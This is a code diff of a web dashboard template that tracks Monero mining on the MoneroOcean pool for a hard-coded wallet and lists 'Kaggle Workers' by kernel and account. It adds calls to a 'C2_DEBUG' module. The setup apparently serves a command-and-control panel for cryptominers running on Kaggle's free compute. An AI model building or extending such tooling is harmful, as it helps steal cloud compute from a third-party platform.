@@ -74,14 +74,6 @@
         background: var(--bg-card);
         border: 1px solid var(--border);
     }
-    .tab-container {
-        margin-bottom: 20px;
-    }
-    .tab-buttons {
-        display: flex;
-        gap: 10px;
-        margin-bottom: 20px;
-    }
     .tab-btn {
         padding: 10px 20px;
         background: var(--bg-card);
@@ -118,7 +110,7 @@
 {% block content %}
 
 <div class="tab-container">
-    <div class="tab-buttons">
+    <div class="tabs">
         <button class="tab-btn active" onclick="switchTab('stats')">📊 Statistics</button>
         <button class="tab-btn" onclick="switchTab('workers')">👷 Workers</button>
         <button class="tab-btn" onclick="switchTab('dashboard')">🌐 Pool Dashboard</button>
@@ -145,64 +137,76 @@
             </div>
         </div>
 
-        <div class="card">
-            <h2>Pool Workers</h2>
-            <div class="workers-table">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Worker ID</th>
-                            <th>Status</th>
-                            <th>Hashrate</th>
-                            <th>Last Share</th>
-                            <th>Total Shares</th>
-                        </tr>
-                    </thead>
-                    <tbody id="workers-tbody">
-                        <tr>
-                            <td colspan="5" style="text-align: center; padding: 40px;">
-                                Loading workers...
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-title"><span class="panel-icon">👷</span> Pool Workers</span>
+            </div>
+            <div class="panel-content" style="padding:0">
+                <div class="workers-table">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Worker ID</th>
+                                <th>Status</th>
+                                <th>Hashrate</th>
+                                <th>Last Share</th>
+                                <th>Total Shares</th>
+                            </tr>
+                        </thead>
+                        <tbody id="workers-tbody">
+                            <tr>
+                                <td colspan="5" style="text-align: center; padding: 40px;">
+                                    Loading workers...
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
             </div>
         </div>
     </div>
 
     <!-- Workers Tab -->
     <div id="workers-tab" class="tab-content">
-        <div class="card">
-            <h2>Kaggle Workers</h2>
-            <div class="workers-table">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Worker ID</th>
-                            <th>Kernel</th>
-                            <th>Account</th>
-                            <th>Status</th>
-                            <th>Hashrate</th>
-                            <th>Uptime</th>
-                        </tr>
-                    </thead>
-                    <tbody id="kaggle-workers-tbody">
-                        <tr>
-                            <td colspan="6" style="text-align: center; padding: 40px;">
-                                Loading Kaggle workers...
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-title"><span class="panel-icon">🔷</span> Kaggle Workers</span>
+            </div>
+            <div class="panel-content" style="padding:0">
+                <div class="workers-table">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Worker ID</th>
+                                <th>Kernel</th>
+                                <th>Account</th>
+                                <th>Status</th>
+                                <th>Hashrate</th>
+                                <th>Uptime</th>
+                            </tr>
+                        </thead>
+                        <tbody id="kaggle-workers-tbody">
+                            <tr>
+                                <td colspan="6" style="text-align: center; padding: 40px;">
+                                    Loading Kaggle workers...
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
             </div>
         </div>
     </div>
 
     <!-- Pool Dashboard Tab -->
     <div id="dashboard-tab" class="tab-content">
-        <div class="card">
-            <h2>MoneroOcean Dashboard</h2>
-            <iframe id="pool-iframe" src=""></iframe>
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-title"><span class="panel-icon">🌐</span> MoneroOcean Dashboard</span>
+            </div>
+            <div class="panel-content" style="padding:0">
+                <iframe id="pool-iframe" src=""></iframe>
+            </div>
         </div>
     </div>
 </div>
@@ -211,31 +215,44 @@
 
 {% block scripts %}
 <script>
+    // Initialize debug module
+    C2_DEBUG.initPage('moneroocean');
+    
     const WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5';
     const POOL_URL = 'https://moneroocean.stream';
     const POOL_API = 'https://api.moneroocean.stream';
 
     function switchTab(tab) {
+        try {
         // Update buttons
         document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-        event.target.classList.add('active');
+        if (event && event.target) event.target.classList.add('active');
 
         // Update content
         document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
-        document.getElementById(tab + '-tab').classList.add('active');
+        const tabEl = document.getElementById(tab + '-tab');
+        if (tabEl) tabEl.classList.add('active');
 
         // Load iframe if dashboard tab
         if (tab === 'dashboard') {
             const iframe = document.getElementById('pool-iframe');
-            if (!iframe.src) {
+            if (iframe && !iframe.src) {
                 iframe.src = `${POOL_URL}/#/dashboard`;
             }
+        }
+        C2_DEBUG.debug('MoneroOcean', 'Switched to tab: ' + tab);
+        } catch (err) {
+            C2_DEBUG.error('MoneroOcean', 'Error switching tab', err);
         }
     }
 
     async function fetchPoolStats() {
+        C2_DEBUG.debug('MoneroOcean', 'Fetching pool stats...');
         try {
             const response = await fetch(`${POOL_API}/miner/${WALLET}/stats`);
+            if (!response.ok) {
+                throw new Error('API returned ' + response.status);
+            }
             const data = await response.json();
             
             // Update stats
@@ -271,16 +288,21 @@
                     tbody.appendChild(row);
                 });
             }
+            C2_DEBUG.success('MoneroOcean', 'Pool stats loaded: ' + workerCount + ' workers');
         } catch (error) {
-            console.error('Error fetching pool stats:', error);
+            C2_DEBUG.error('MoneroOcean', 'Error fetching pool stats', error);
             document.getElementById('workers-tbody').innerHTML = 
-                '<tr><td colspan="5" style="text-align: center; padding: 40px; color: red;">Error loading data</td></tr>';
+                '<tr><td colspan="5" style="text-align: center; padding: 40px; color: var(--red);">Error loading data: ' + error.message + '</td></tr>';
         }
     }
 
     async function fetchKaggleWorkers() {
+        C2_DEBUG.debug('MoneroOcean', 'Fetching Kaggle workers...');
         try {
             const response = await fetch('/api/kaggle/agents/status');
+            if (!response.ok) {
+                throw new Error('API returned ' + response.status);
+            }
             const data = await response.json();
             
             const tbody = document.getElementById('kaggle-workers-tbody');
@@ -308,25 +330,27 @@
                     tbody.appendChild(row);
                 });
             }
+            C2_DEBUG.success('MoneroOcean', 'Kaggle workers loaded: ' + (data.agents?.length || 0));
         } catch (error) {
-            console.error('Error fetching Kaggle workers:', error);
+            C2_DEBUG.error('MoneroOcean', 'Error fetching Kaggle workers', error);
         }
     }
 
     function formatHashrate(hash) {
         if (hash >= 1000000) return (hash / 1000000).toFixed(2) + ' MH/s';
         if (hash >= 1000) return (hash / 1000).toFixed(2) + ' KH/s';
-        return hash.toFixed(2) + ' H/s';
+        return (hash || 0).toFixed(2) + ' H/s';
     }
 
     function formatXMR(amount) {
-        return (amount / 1000000000000).toFixed(6) + ' XMR';
+        return ((amount || 0) / 1000000000000).toFixed(6) + ' XMR';
     }
 
     function refreshStats() {
         fetchPoolStats();
         fetchKaggleWorkers();
         showNotification('Pool stats refreshed', 'green');
+        C2_DEBUG.info('MoneroOcean', 'Stats refreshed manually');
     }
 
     // Initial load
